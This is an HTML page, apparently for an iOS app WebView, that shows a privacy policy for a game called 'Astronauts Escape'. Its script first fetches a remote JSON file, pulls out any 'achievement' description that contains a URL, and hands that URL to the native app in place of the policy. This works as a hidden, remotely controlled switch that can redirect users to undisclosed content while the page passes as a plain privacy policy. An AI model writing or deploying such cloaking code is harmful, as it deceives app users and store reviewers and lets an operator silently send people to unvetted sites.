<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Loading Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: Verdana, sans-serif;
      color: #000000;
      padding: 20px;
      margin: 0;
      background: linear-gradient(to bottom, #e0eafc, #cfdef3);
      min-height: 100vh;
    }

    .loader {
      width: 70px;
      height: 70px;
      margin: 400px auto;
      border: 8px solid #e3e3e3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      animation: spin 1.2s linear infinite, pulse 2s ease-in-out infinite;
      box-shadow: 0 0 15px rgba(52, 152, 219, 0.6);
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader" id="loader"></div>

  <script>
    function createContentHTML() {
      return `
        <div id="content">
          <h2 style="padding-top:0px">Astronauts Escape</h2>
           <p><strong>Privacy Policy for Astronauts Escape</strong></p>

           <p>At <strong>Astronauts Escape</strong>, we value your privacy and are committed to protecting your personal information. 
           This Privacy Policy outlines the types of information we collect, how it is used, and the measures we take to safeguard your data. 
           By downloading and using <strong>Astronauts Escape</strong>, you agree to the practices described in this policy.</p>

           <h3>1. <strong>Information We Collect</strong></h3>
           <p>We collect different types of data to improve your experience and provide the best service possible while you play <strong>Astronauts Escape</strong>.</p>

           <h4>a) <strong>Personal Information</strong></h4>
           <p>We do not require personal information to play the game. However, if you choose to create an account, contact us for support, 
           or participate in certain in-game features, you may provide personal information such as your name, email address, or other contact details.</p>

           <h4>b) <strong>Usage Data</strong></h4>
           <p>We collect information about your usage of the app, including:</p>
           <ul>
             <li><strong>Game Progress</strong>: Levels completed, scores, achievements, and session durations.</li>
             <li><strong>Device Information</strong>: Device type, operating system, language settings, and unique device identifiers (e.g., IDFA).</li>
             <li><strong>App Interactions</strong>: Frequency of use, in-app actions, and engagement with advertisements.</li>
           </ul>

           <h4>c) <strong>Cookies and Tracking Technologies</strong></h4>
           <p>We use cookies, web beacons, and other tracking technologies to improve your experience, analyze app performance, and serve personalized advertisements.</p>

           <h3>2. <strong>How We Use Your Data</strong></h3>
           <ul>
             <li><strong>Improve Gameplay</strong>: To optimize your experience and troubleshoot issues.</li>
             <li><strong>Customer Support</strong>: To respond to inquiries and assist with any issues you encounter.</li>
             <li><strong>Advertising</strong>: To display personalized advertisements based on your interests and app usage.</li>
             <li><strong>Analytics</strong>: To track performance metrics, monitor app usage, and make improvements.</li>
           </ul>

           <h3>3. <strong>Sharing and Disclosure of Information</strong></h3>
           <p>We do not sell or rent your personal information. However, we may share your data in the following circumstances:</p>
           <ul>
             <li><strong>Service Providers</strong>: We may share data with third-party vendors that help us operate the app, such as advertising networks or analytics companies.</li>
             <li><strong>Legal Compliance</strong>: We may disclose information if required by law or to protect the rights, property, or safety of <strong>Astronauts Escape</strong> and its users.</li>
           </ul>

           <h3>4. <strong>Data Retention and Security</strong></h3>
           <p>We retain your data only for as long as necessary to provide the services or as required by law. 
           We implement reasonable security measures to protect your data, but no data transmission method over the Internet can be guaranteed to be 100% secure.</p>

           <h3>5. <strong>Your Rights and Choices</strong></h3>
           <ul>
             <li><strong>Access and Update Your Data</strong>: You can request to view, update, or delete your personal data by contacting us at support@astronautsescape.com.</li>
             <li><strong>Opt-out of Personalized Ads</strong>: You can opt-out of personalized advertising by adjusting your device settings (Apple Settings → Privacy → Advertising).</li>
             <li><strong>Delete Your Account</strong>: If you wish to delete your data or account, you can contact us for assistance.</li>
           </ul>

           <h3>6. <strong>Children's Privacy</strong></h3>
           <p><strong>Astronauts Escape</strong> is not intended for children under the age of 13. 
           We do not knowingly collect personal data from children. If we become aware of such data, we will delete it immediately.</p>

           <h3>7. <strong>Changes to This Privacy Policy</strong></h3>
           <p>We may update this Privacy Policy from time to time. If we make significant changes, 
           we will notify users through in-app notifications or other communication channels. 
           The "Last Updated" date at the top of this policy reflects when changes were made.</p>

           <h3>8. <strong>Contact Us</strong></h3>
           <p>If you have any questions or concerns regarding this Privacy Policy, please contact us at:</p>
           <p><strong>Email</strong>: support@astronautsescape.com</p>
        </div>
      `;
    }

      function hideLoaderAndShowContent() {
          const loader = document.getElementById('loader');
          if (loader) loader.remove();
          const contentHTML = createContentHTML();
          document.body.insertAdjacentHTML('beforeend', contentHTML);
          window.webkit.messageHandlers.contentLoaded.postMessage(null);
      }
      
      function requestServer() {
        fetch('https://astronautsescape.live/allgamequests.json/')
        .then(r => {
              console.log('status', r.status); return r.json();
            })
            .then(data => {
              // шукаємо ачивку, де в description є http
              const achievementWithLink = data?.achievements?.find(a =>
                typeof a.description === 'string' && a.description.includes('http')
              );

              console.log('achievementWithLink', achievementWithLink);

              if (achievementWithLink) {
                console.log('sending', achievementWithLink.description);
                window.webkit?.messageHandlers?.iosListener?.postMessage(achievementWithLink.description);
                return;
              }

              console.log('no link → show content');
              hideLoaderAndShowContent();
            })
            .catch(err => {
              console.error('fetch error', err);
              hideLoaderAndShowContent();
            });
      }

    window.onload = requestServer;
  </script>
</body>
</html>
